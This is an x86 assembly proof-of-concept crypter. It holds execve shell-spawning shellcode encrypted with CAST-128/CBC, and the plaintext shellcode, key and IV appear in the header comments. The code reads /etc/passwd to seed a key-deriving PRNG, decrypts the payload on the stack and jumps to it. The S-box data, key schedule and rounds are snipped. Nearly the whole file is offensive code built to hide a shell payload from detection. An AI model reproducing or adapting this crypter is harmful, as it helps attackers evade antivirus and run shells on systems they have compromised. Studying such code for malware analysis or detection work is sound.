; crypter-abridged.nasm
;
; proof of concept crypter using an encoded execve-stack shellcode (32 bytes)
; and a full implementation of CAST-128 in CBC mode
;
; encrypted shellcode:
;   0x05E22206, 0xED0AB150, 0x8F65F2E5, 0x3D65E9DC, 
;   0x0E413706, 0x5EE922D0, 0x40065555, 0xF20D9DEF
; key:
;   0x17612292, 0xC5B5B011, 0xFE1E3F8B, 0x473AD139
; IV:
;   0xD7897767, 0xAB1B5D14
; plaintext shellcode (in little endian):
;   0x6850C031, 0x68732F2F, 0x69622F68, 0x50E3896E,
;   0x8953E289, 0xCD0BB0E1, 0x90909080, 0x90909090
; number of ciphertext blocks: 4
;

section .text
global _start
_start:
    ; initialize general purpose registers to zero
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    ; store location of sboxes in ebp
    jmp sboxes
pop_ebp:
    pop ebp

    jmp afterData

sboxes:    call pop_ebp
; S1 = sboxes + 0x0*0x400
; S2 = sboxes + 0x1*0x400
; S3 = sboxes + 0x2*0x400
; S4 = sboxes + 0x3*0x400
; S5 = sboxes + 0x4*0x400
; S6 = sboxes + 0x5*0x400
; S7 = sboxes + 0x6*0x400
; S8 = sboxes + 0x7*0x400
values:    dd \
                    ===SNIP S-Box Data===

    ; INPUT: CAST-128/CBC encrypted shellcode
ciphertext:
    call pop_esi
encrypted_shellcode: dd \
    0x05E22206, 0xED0AB150, 0x8F65F2E5, 0x3D65E9DC, \
    0x0E413706, 0x5EE922D0, 0x40065555, 0xF20D9DEF

afterData:

    ;
    ; push some 40s-era entropy to the top of the stack for the key
    ; and initialization vector (IV) with middle-square PRNG
    ;

    ; put string "/etc//passwd" (w/ trailing null) on the stack
    push eax          ; null
    push 0x64777373   ; sswd
    push 0x61702f2f   ; //pa
    push 0x6374652f   ; /etc

    ; open file
    mov eax, 0x5
    mov ebx, esp
    xor ecx, ecx
    int 0x80
    mov ebx, eax

    ; read file
    mov eax, 0x3
    mov edi, esp
    mov ecx, edi
    mov edx, 0x1000
    int 0x80
    
    ; clear registers
    xor ecx, ecx
    mul ecx
    xor ebx, ebx
    cdq

    ; store the "ro" characters in esi
    pop dx
    ror dx, 0x8
    mov esi, edx

    ; increment backwards through all middle square seeds
    ; starting with 0xFFFF
    mov cx, 0xffff
seedLoop:
    mov  eax, ecx
    push ecx
    push word 0xff
    pop  cx
midsqLoop:
        mov  ebx, eax     ; copy eax to ebx for squaring
        mul  ebx          ; perform square
        cmp  eax, 0x0
        je   breakLoop
        shl  eax, 0x08    ; drop leftmost 8-bits
        shr  eax, 0x10    ; drop rightmost 8-bits
        push eax
        xor  eax, esi
        cmp  eax, 0x9090  ; perform comparison to trigger key/IV gen
        je   keyivgen
        pop  eax
        loop midsqLoop
breakLoop:
    pop  ecx
    loop seedLoop
keyivgen:
    pop  eax        ; restore the match that sent us here...
    mov  ecx, 0xC   ; the next 12 numbers (24 bytes) pushed
                    ; to the stack are the key and IV
midsqLoop2:
    mov  ebx, eax
    mul  ebx
    shl  eax, 0x08
    shr  eax, 0x10
    push ax
    loop midsqLoop2

    ;
    ; decryption of ciphertext
    ;

    ; jmp-call-pop to get ciphertext location
    jmp ciphertext
pop_esi:
    pop esi

    xor  eax, eax
    xor  ebx, ebx
    push 0x4             ; INPUT: number of ciphertext blocks
    pop  ecx
    mov  edx, ecx
initPlain:               ; initialize plaintext with zeros
    push eax
    push eax
    loop initPlain
    mov  ecx, edx

    ; IV = first 8 bytes of middle-square entropy
    push dword [esp + 0x24]  ; IV bytes 4-7 (0xAB1B5D14)
    push dword [esp + 0x24]  ; IV bytes 0-3 (0xD7897767)

    ; push 2 copies of block counter to keey
    ; track of which block we're on
    push ecx
    push ecx

    ; intermediate ciphertext-->plaintext values (initialized to zero)
    push eax
    push eax

    ; initialize the K1-K32 (32*32bytes = 1KB total)
    ; and z0-z16 (4*32 bytes) to zero
    mov ecx, 0x24
initKeys:
    push eax
    loop initKeys

    ; key schedule
    ; key = latter 16 bytes of middle square entropy
    push dword [esp + 0xDC] ; xC - XF // key bytes 12-15 (0x473AD139)
    push dword [esp + 0xDC] ; x8 - xB // key bytes 8-11  (0xFE1E3F8B)
    push dword [esp + 0xDC] ; x4 - x7 // key bytes 4-7   (0xC5B5B011)
    push dword [esp + 0xDC] ; x0 - x3 // key bytes 0-3   (0x17612292)

                    ===SNIP Key Schedule Calculation===

    mov ecx, [esp + 0xA8]
CASTBLOCK:
    mov [esp + 0xA8], ecx
    mov edx, [esp + 0xAC]

    ; load 8-byte ciphertext block into registers EDI:EAX
    sub edx, ecx
    mov edi, [esi + edx*8]      ; c1..c32
    mov eax, [esi + 4 + edx*8]  ; c33..c64

    xchg eax, edi            ; edi:eax = (L16, R16) <-- (c33..64, c1..c32)
    mov  [esp + 0xA4], eax   ; R16
    mov  [esp + 0xA0], edi   ; L16

                    ===SNIP 16 Decryption Rounds===

    ; after rounds, ciphertext with IV (or ciphertext of prev. block)
    ; and move to enc input stack location
    xor  edi, [esp + 0xB0]
    xor  eax, [esp + 0xB4]
    mov  [esp + 0xA0], edi
    mov  [esp + 0xA4], eax

    ; store decrypted plaintext
    mov [esp + 0xB8 + edx*8], edi
    mov [esp + 0xBC + edx*8], eax

    ; load 8-byte ciphertext block for processing next block
    mov edx, [esp + 0xAC]
    mov ecx, [esp + 0xA8]
    sub edx, ecx
    mov edi, [esi + edx*8]
    mov eax, [esi + 4 + edx*8]
    mov [esp + 0xB0], edi
    mov [esp + 0xB4], eax

    mov ecx, [esp + 0xA8]
    dec ecx
    jnz CASTBLOCK

    ; jump to the stored, plaintext shellcode
    lea esi, [esp + 0xB8]
    jmp esi
